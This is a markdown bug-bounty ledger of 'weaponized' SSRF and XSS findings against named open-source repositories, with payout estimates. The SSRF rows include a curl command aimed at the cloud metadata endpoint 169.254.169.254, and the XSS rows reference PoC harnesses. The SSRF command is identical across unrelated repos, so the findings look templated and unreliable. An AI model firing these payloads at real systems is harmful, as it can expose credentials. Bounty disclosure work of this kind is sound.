# Bounty Ledger

Weaponized findings from `janitor hunt` campaigns, cross-referenced against
program scope and severity tiers. Only findings with a concrete `repro_cmd`,
reproduction payload, or generated HTML harness are entered.

| Date | Target Repo | Vulnerability Class | Severity | Expected Payout | Approval % | Exact Repro Command |
|------|-------------|---------------------|----------|-----------------|------------|---------------------|
| 2026-05-01 | immutable/ts-immutable-sdk | SSRF (7 production HTTP clients) | P2/Severe | $1000–$3000 | 65% | `curl -X POST http://target.local/vulnerable -H 'Content-Type: application/json' -d '{"url": "http://169.254.169.254/latest/meta-data/"}'` |
| 2026-05-01 | immutable/ts-immutable-sdk | DOM XSS — embeddedLoginPromptOverlay.ts:25 | P2/Severe | $1000–$2000 | 75% | HTML harness — `cat janitor-dom-xss-poc.html; python3 -m http.server 8765` |
| 2026-05-01 | mattermost/mattermost-plugin-boards | React XSS (dangerouslySetInnerHTML ×9 block editor components) | P2/Severe | $500–$1500 | 70% | Inject payload via board block text input reaching dangerouslySetInnerHTML sink |
| 2026-05-01 | mattermost/mattermost-plugin-boards | DOM XSS — webapp/src/utils.ts:143 | P2/Severe | $500–$1500 | 75% | HTML harness — `cat janitor-dom-xss-poc.html; python3 -m http.server 8765` |
| 2026-05-01 | mattermost/mattermost-plugin-calls | SSRF — standalone/src/recording/index.tsx:40 | P2/Severe | $500–$1500 | 60% | `curl -X POST http://target.local/vulnerable -H 'Content-Type: application/json' -d '{"url": "http://169.254.169.254/latest/meta-data/"}'` |
